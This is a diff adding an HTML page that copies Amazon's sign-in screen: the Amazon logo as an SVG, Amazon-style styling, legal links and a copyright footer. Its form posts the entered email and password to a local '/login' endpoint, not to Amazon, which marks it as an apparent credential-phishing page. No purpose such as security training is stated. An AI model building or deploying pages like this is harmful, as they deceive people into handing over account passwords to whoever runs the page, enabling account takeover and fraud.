@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Amazon Sign-In</title>
+<link rel="icon" href="https://www.amazon.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes slideDown{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
+@keyframes arrowBounce{0%,100%{transform:translateX(0)}50%{transform:translateX(5px)}}
+body{font-family:'Amazon Ember',Arial,sans-serif;background:linear-gradient(to bottom,#f0f2f2 0%,#fff 100%);min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
+.header{margin-bottom:20px;animation:slideDown 0.5s ease}
+.header svg{width:100px;height:30px}
+.card{background:white;border:1px solid #ddd;border-radius:8px;padding:26px 26px 20px;max-width:350px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,0.06);animation:fadeInUp 0.6s cubic-bezier(0.16,1,0.3,1)}
+h1{font-size:28px;font-weight:400;color:#0f1111;margin-bottom:18px}
+.input-group{margin-bottom:14px;animation:fadeInUp 0.5s ease 0.2s both}
+.input-group label{display:block;font-size:13px;font-weight:700;color:#0f1111;margin-bottom:4px}
+.input-group input{width:100%;padding:8px 10px;border:1px solid #949494;border-radius:4px;font-size:14px;outline:none;transition:all 0.2s}
+.input-group input:focus{border-color:#e77600;box-shadow:0 0 0 3px rgba(231,118,0,0.15)}
+.login-btn{width:100%;padding:10px;background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;border-radius:8px;font-size:14px;color:#0f1111;cursor:pointer;margin-top:6px;transition:all 0.2s;animation:fadeInUp 0.5s ease 0.3s both}
+.login-btn:hover{background:linear-gradient(to bottom,#f5d78e,#eeb933)}
+.legal{font-size:12px;color:#0f1111;margin-top:18px;line-height:1.5;animation:fadeIn 0.5s ease 0.4s both}
+.legal a{color:#0066c0;text-decoration:none}
+.legal a:hover{text-decoration:underline;color:#c45500}
+.divider{border-top:1px solid #e7e7e7;margin:20px 0;position:relative;animation:fadeIn 0.5s ease 0.5s both}
+.divider span{position:absolute;top:-10px;left:50%;transform:translateX(-50%);background:white;padding:0 8px;color:#767676;font-size:12px}
+.new-btn{width:100%;padding:10px;background:linear-gradient(to bottom,#f7f8fa,#e7e9ec);border:1px solid #adb1b8;border-radius:8px;font-size:14px;color:#0f1111;cursor:pointer;transition:all 0.2s;animation:fadeInUp 0.5s ease 0.6s both}
+.new-btn:hover{background:linear-gradient(to bottom,#e7eaf0,#d7d9dc)}
+.footer{margin-top:auto;padding:20px;text-align:center;font-size:11px;color:#767676;animation:fadeIn 0.5s ease 0.7s both}
+.footer a{color:#0066c0;text-decoration:none;margin:0 8px}
+</style>
+</head>
+<body>
+<div class="header">
+    <svg viewBox="0 0 602.28 182.11" xmlns="http://www.w3.org/2000/svg">
+        <path d="M373.64 141.27c-34.06 25.15-83.43 38.56-125.92 38.56-59.59 0-113.24-22.04-153.81-58.73-3.19-2.88-.33-6.82 3.51-4.57 43.79 25.52 97.95 40.89 153.91 40.89 37.75 0 79.29-7.82 117.51-24.01 5.76-2.51 10.63 3.58 4.8 7.86z" fill="#f90"/>
+        <path d="M387.91 124.91c-4.36-5.59-28.83-2.65-39.88-1.33-3.35.4-3.86-2.51-.83-4.63 19.59-13.75 51.69-9.79 55.42-5.19 3.72 4.63-.99 36.82-19.36 52.21-2.82 2.37-5.51 1.11-4.27-2.01 4.1-10.33 13.28-33.46 8.92-39.05z" fill="#f90"/>
+        <path d="M348.99 20.56V7.14c0-2.04 1.55-3.39 3.39-3.39h61.59c1.92 0 3.47 1.38 3.47 3.39v11.49c-.02 1.95-1.66 4.52-4.55 8.52l-31.9 45.72c11.86-.29 24.39 1.49 35.12 7.53 2.44 1.38 3.11 3.39 3.28 5.37v14.29c0 2.04-2.22 4.41-4.55 3.22-19.12-10.01-44.53-11.12-65.68.16-2.16 1.16-4.44-1.16-4.44-3.22V86.6c0-2.19.03-5.92 2.22-9.24l36.93-53.02h-31.43c-1.92 0-3.45-1.74-3.45-3.78z" fill="#0f1111"/>
+        <path d="M139.56 99.94h-18.72c-1.79-.14-3.22-1.47-3.36-3.22V7.44c0-1.92 1.58-3.47 3.53-3.47h17.47c1.81.08 3.25 1.47 3.39 3.22v11.63h.33c4.55-12.04 13.09-17.63 24.62-17.63 11.7 0 18.97 5.59 24.22 17.63 4.55-12.04 14.92-17.63 26.12-17.63 7.97 0 16.61 3.22 21.83 10.42 5.88 8.05 4.72 19.71 4.72 30.14v54.64c0 1.92-1.58 3.47-3.53 3.47h-18.72c-1.89-.14-3.36-1.61-3.36-3.47V50.87c0-4.05.33-14.17-.5-17.8-1.33-6.09-5.22-7.78-10.28-7.78-4.22 0-8.61 2.82-10.44 7.28-1.83 4.47-1.66 11.95-1.66 18.3v45.44c0 1.92-1.58 3.47-3.53 3.47h-18.72c-1.89-.14-3.36-1.61-3.36-3.47V50.87c0-10.67 1.75-26.33-10.78-26.33-12.7 0-12.2 14.33-12.2 26.33v45.44c0 1.92-1.58 3.47-3.53 3.47l-.01.16z" fill="#0f1111"/>
+    </svg>
+</div>
+<div class="card">
+    <h1>Sign in</h1>
+    <form action="/login" method="POST">
+        <div class="input-group">
+            <label>Email or mobile phone number</label>
+            <input type="text" name="email" required>
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" name="password" placeholder="Type your password" required>
+        </div>
+        <button type="submit" class="login-btn">Continue</button>
+    </form>
+    <p class="legal">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
+    <div class="divider"><span>New to Amazon?</span></div>
+    <button class="new-btn">Create your Amazon account</button>
+</div>
+<div class="footer">
+    <a href="#">Conditions of Use</a> · <a href="#">Privacy Notice</a> · <a href="#">Help</a>
+    <br>© 1996-2024, Amazon.com, Inc.
+</div>
+</body>
+</html>
